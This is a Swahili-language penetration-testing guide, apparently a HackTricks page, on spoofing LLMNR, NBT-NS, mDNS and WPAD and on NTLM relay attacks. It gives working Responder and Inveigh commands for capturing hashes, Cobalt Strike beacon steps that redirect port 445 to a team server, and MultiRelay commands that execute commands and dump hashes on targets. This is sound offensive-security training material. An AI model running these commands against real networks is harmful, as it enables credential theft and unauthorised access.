# Kudanganya LLMNR, NBT-NS, mDNS/DNS na WPAD na Mashambulizi ya Kurelayi

{% hint style="success" %}
Jifunze & zoezi la AWS Kudukua:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze & zoezi la GCP Kudukua: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Itifaki za Mtandao

### Itifaki za Azimio la Mwenyeji wa Mitaani
- **LLMNR, NBT-NS, na mDNS**:
- Microsoft na mifumo mingine hutumia LLMNR na NBT-NS kwa azimio la majina ya mitaa wakati DNS inashindwa. Vivyo hivyo, mifumo ya Apple na Linux hutumia mDNS.
- Itifaki hizi zinaweza kudukuliwa na kudanganywa kutokana na asili yao ya kutangazwa bila uthibitisho kupitia UDP.
- [Responder](https://github.com/lgandx/Responder) inaweza kutumika kujifanya kuwa huduma kwa kutuma majibu bandia kwa mifumo inayouliza itifaki hizi.
- Taarifa zaidi kuhusu kujifanya kuwa huduma kwa kutumia Responder inaweza kupatikana [hapa](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Itifaki ya Ugunduzi wa Kiotomatiki wa Wavuti (WPAD)
- WPAD inaruhusu vivinjari kugundua mipangilio ya proksi kiotomatiki.
- Ugunduzi unafanikishwa kupitia DHCP, DNS, au kurudi kwa LLMNR na NBT-NS ikiwa DNS inashindwa.
- Responder inaweza kusaidia mashambulizi ya WPAD, kuongoza wateja kwenye seva za WPAD zenye nia mbaya.

### Responder kwa Sumu ya Itifaki
- **Responder** ni chombo kinachotumika kwa sumu ya maswali ya LLMNR, NBT-NS, na mDNS, kujibu kwa hiari kulingana na aina za maswali, kwa kuzingatia huduma za SMB kwa kiasi kikubwa.
- Kinakuja kikiwa kimewekwa tayari kwenye Kali Linux, kinaweza kubadilishwa kwa `/etc/responder/Responder.conf`.
- Responder inaonyesha vibonyezo vilivyochukuliwa kwenye skrini na kuvihifadhi kwenye saraka ya `/usr/share/responder/logs`.
- Inasaidia IPv4 na IPv6.
- Toleo la Windows la Responder linapatikana [hapa](https://github.com/lgandx/Responder-Windows).

#### Kuendesha Responder
- Kuanzisha Responder na mipangilio ya msingi: `responder -I <Interface>`
- Kwa uchunguzi wenye msukumo zaidi (ukiwa na athari za upande): `responder -I <Interface> -P -r -v`
- Mbinu za kukamata changamoto/majibu ya NTLMv1 kwa urahisi zaidi: `responder -I <Interface> --lm --disable-ess`
- Udanganyifu wa WPAD unaweza kuamilishwa kwa: `responder -I <Interface> --wpad`
- Maombi ya NetBIOS yanaweza kutatuliwa kwa anwani ya IP ya mshambuliaji, na proksi ya uthibitishaji inaweza kuwekwa: `responder.py -I <interface> -Pv`

### Sumu ya DHCP na Responder
- Kudanganya majibu ya DHCP kunaweza kudhuru kudumu maelekezo ya mwendeshaji wa mwathiriwa, kutoa mbadala wa kimya kwa sumu ya ARP.
- Inahitaji maarifa sahihi ya usanidi wa mtandao wa lengo.
- Kuendesha shambulio: `./Responder.py -I eth0 -Pdv`
- Mbinu hii inaweza kukamata vibonyezo vya NTLMv1/2 kwa ufanisi, lakini inahitaji kushughulikiwa kwa uangalifu ili kuepuka kuvuruga mtandao.

### Kukamata Vibonyezo na Responder
- Responder itajifanya kuwa huduma kwa kutumia itifaki zilizotajwa hapo juu, kukamata vibonyezo (kawaida NTLMv2 Challenge/Response) wakati mtumiaji anajaribu kuthibitisha dhidi ya huduma zilizodanganywa.
- Jaribio linaweza kufanywa la kudhoofisha hadi NetNTLMv1 au kulemaza ESS kwa urahisi zaidi wa kuvunja vibonyezo.

Ni muhimu kuzingatia kwamba kutumia mbinu hizi inapaswa kufanywa kihalali na kimaadili, kuhakikisha idhini sahihi na kuepuka kuvuruga au kupata ufikiaji usioruhusiwa.

## Inveigh

Inveigh ni chombo kwa wataalamu wa upenyezi na timu nyekundu, kilichoundwa kwa mifumo ya Windows. Kinatoa utendaji kama wa Responder, kutekeleza kudanganya na mashambulizi ya kati. Chombo hicho kimebadilika kutoka kwa script ya PowerShell hadi binary ya C#, na [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) na [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) kama toleo kuu. Maelezo ya kina ya vigezo na maagizo yanaweza kupatikana kwenye [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh inaweza kutumika kupitia PowerShell:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Au kutekelezwa kama faili ya C#:
```bash
Inveigh.exe
```
### Shambulizi la Kurejesha NTLM

Shambulizi hili linatumia vikao vya uthibitishaji wa SMB kufikia mashine ya lengo, ikitoa kabati ya mfumo ikiwa ni mafanikio. Vigezo muhimu ni pamoja na:
- Mtumiaji anayethibitisha lazima awe na ufikiaji wa Msimamizi wa Ndani kwenye mwenyeji uliopokea.
- Kusainiwa kwa SMB inapaswa kuwa imelemazwa.

#### Kusukuma Bandari 445 na Kutunelisha

Katika hali ambapo uanzishaji wa moja kwa moja wa mtandao hauwezekani, trafiki kwenye bandari 445 inahitaji kusukumwa na kutunelishwa. Zana kama [**PortBender**](https://github.com/praetorian-inc/PortBender) husaidia katika kuelekeza trafiki ya bandari 445 kwenda bandari nyingine, ambayo ni muhimu wakati ufikiaji wa msimamizi wa ndani unapatikana kwa kupakia dereva.

Usanidi na uendeshaji wa PortBender katika Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Vifaa Vingine kwa Shambulio la NTLM Relay

- **Metasploit**: Weka kwa mawakala, maelezo ya mwenyeji wa ndani na wa mbali.
- **smbrelayx**: Skripti ya Python kwa kurejesha vikao vya SMB na kutekeleza amri au kuweka mlango wa nyuma.
- **MultiRelay**: Zana kutoka kwa seti ya Responder kwa kurejesha watumiaji maalum au wote, kutekeleza amri, au kudondosha hashi.

Kila chombo kinaweza kusanidiwa kufanya kazi kupitia mwendeshaji wa SOCKS ikiwa ni lazima, kuruhusu mashambulizi hata na ufikiaji wa mtandao usio wa moja kwa moja.

### Uendeshaji wa MultiRelay

MultiRelay inatekelezwa kutoka kwenye _**/usr/share/responder/tools**_ directory, ikilenga IPs au watumiaji maalum.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### Kulazimisha Kuingia kwa NTLM

Katika Windows **unaweza kuwalazimisha baadhi ya akaunti zenye mamlaka kuingia kwa mashine za kupendelea**. Soma ukurasa ufuatao kujifunza jinsi:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Marejeo
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
Jifunze & zoezi Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze & zoezi Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha** [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
